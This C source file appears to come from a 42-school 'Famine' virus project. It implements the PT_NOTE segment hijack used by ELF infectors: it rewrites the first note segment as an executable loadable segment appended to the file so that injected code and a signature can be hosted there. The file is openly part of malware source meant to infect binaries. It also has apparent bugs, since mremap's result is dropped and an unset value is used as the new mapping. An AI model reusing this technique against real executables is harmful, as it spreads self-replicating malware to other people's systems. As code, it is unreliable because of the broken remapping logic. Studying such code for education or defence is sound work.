/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   note_segment.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/06 12:30:43 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static Elf64_Phdr	*exec_segment(elf_data *data);
static bool			find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size);

//	Changes the first PT_NOTE segment into an executable segment that will host our code
//
//	Returns true on fatal error
bool	change_note_segment(profiling *this, elf_data *data) {
	size_t		note_off = 0;
	int64_t		ret = 0;
	uint64_t	new_seg_size;
	Elf64_Phdr	*note = NULL;
	Elf64_Phdr	*exec = NULL;

	(void)this;
	(void)ret;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		note = &data->segments[i];

		if (note->p_type == PT_NOTE) {
			printf("Note segment:\n");
			printf("Start in file:\t\t0x%04lx\n", note->p_offset);
			printf("Virtual address:\t0x%04lx\n", note->p_vaddr);
			printf("Size in size:\t\t0x%04lx\n", note->p_filesz);
			printf("Alignment:\t\t0x%04lx\n\n", note->p_align);
			note_off = (size_t)note - (size_t)data->file;
			break;
		}
	}

	new_seg_size = ((Elf64_Phdr *)((size_t)data->file + note_off))->p_filesz + this->size +
						SIGNATURE_OFFSET + SIGNATURE_LEN;
	new_seg_size += 0x1000 - (new_seg_size % 0x1000);

	// Extend
	mremap(ret, data->file, data->mmap_size, data->mmap_size + new_seg_size, MREMAP_MAYMOVE);
	if (ret >= -22 && ret < 0) {
		printf(FILE_LINE("mremap \033[31mfailed\033[0m: %ld\n"), ret);
		return true;
	}

	//	Resetting data fields to match the new mmap
	data->file = (byte *)ret;
	data->elf = (Elf64_Ehdr *)data->file;
	data->sections = (Elf64_Shdr *)(data->file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(data->file + data->elf->e_phoff);

	//	The important segments
	note = (Elf64_Phdr *)(data->file + note_off);
	exec = exec_segment(data);

	//	Changing the values of the PT_NOTE header
	find_pvaddr(data, note, new_seg_size);
	note->p_flags = PF_R | PF_X;
	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
	note->p_memsz = note->p_filesz;
	note->p_offset = data->mmap_size;
	note->p_align = exec->p_align;

	return false;
}

static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
	Elf64_Phdr	*seg = NULL;
	size_t		vmax = 0;
	size_t		pmax = 0;
	size_t		current = 0;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		seg = &data->segments[i];
	
		current = seg->p_vaddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
		if (current > vmax) {
			vmax = current;
		}
		
		current = seg->p_paddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
		if (current > pmax) {
			pmax = current;
		}
	}

	vmax = ((vmax / 0x1000) + 1) * 0x1000;
	pmax = ((pmax / 0x1000) + 1) * 0x1000;

	current = vmax + new_seg_size;
	if (current < vmax) {
		printf("vmax + new_seg_size overflowed\n");
		return true;
	}
	current = pmax + new_seg_size;
	if (current < pmax) {
		printf("pmax + new_seg_size overflowed\n");
		return true;
	}

	note->p_vaddr = vmax;
	note->p_paddr = pmax;

	return false;
}

static Elf64_Phdr	*exec_segment(elf_data *data) {
	Elf64_Shdr	*section = NULL;
	Elf64_Phdr	*segment = NULL;

	for (size_t i = 0; i < data->elf->e_shnum; i++) {
		section = &data->sections[i];

		if (ft_memcmp((byte *)".text",
				data->file + data->sections[data->elf->e_shstrndx].sh_offset + section->sh_name,
				6)
			== true)
		{
			for (i = 0; i < data->elf->e_phnum; i++) {
				segment = &data->segments[i];
				size_t	segment_end = segment->p_offset + segment->p_filesz;

				if (segment_end % segment->p_align != 0)
					segment_end += segment->p_align - (segment_end % segment->p_align);

				if (segment->p_type == PT_LOAD &&
					(segment->p_flags == (PF_X | PF_R)) &&
					segment->p_offset <= section->sh_offset &&
					segment_end > (section->sh_offset + section->sh_size))
				{
					return segment;
				}
			}
		}
	}

	return NULL;
}
